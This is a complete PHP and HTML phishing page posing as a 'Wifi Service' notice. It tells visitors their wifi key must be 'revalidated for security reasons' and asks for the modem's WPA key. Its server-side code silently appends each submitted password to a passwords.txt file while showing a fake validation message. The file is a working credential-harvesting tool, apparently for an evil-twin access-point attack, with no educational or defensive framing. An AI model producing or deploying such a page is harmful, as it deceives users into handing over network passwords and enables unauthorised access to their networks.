<?php
	
	if(isset($_POST['button'])){
		if(isset($_POST['password']) && !empty($_POST['password'])){
			$password = $_POST['password'];
			echo 'Please wait for validation of password key: '.$password.'<br>';
			$fp =fopen('passwords.txt', 'a');
			fwrite($fp, $password);
			fwrite($fp, "\n");
			fclose($fp);
		}else {
			echo "Wifi password cannot be empty<br>";
		}
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Service</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #d5dbdb ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	#connecting{
		visibility: hidden;
	}
   
  </style>
</head>
<body>
  <div id="password-form">
      <img src="/wifi-icon3.png" alt="" width="180vw">
      
      <p>Your wifi key needs to be revalidated for security reasons.</p> 
     
	  <form method="post" action="index.php" id="mform"> 
		<p>Please enter your modem's WPA wifi key to connect to the Internet: </p>
		<input type="text" name="password" size="35%">
		<p><input type="submit" name="button"  value="Connect"></p>
	  </form> 
  </div>
	
</body>
</html>

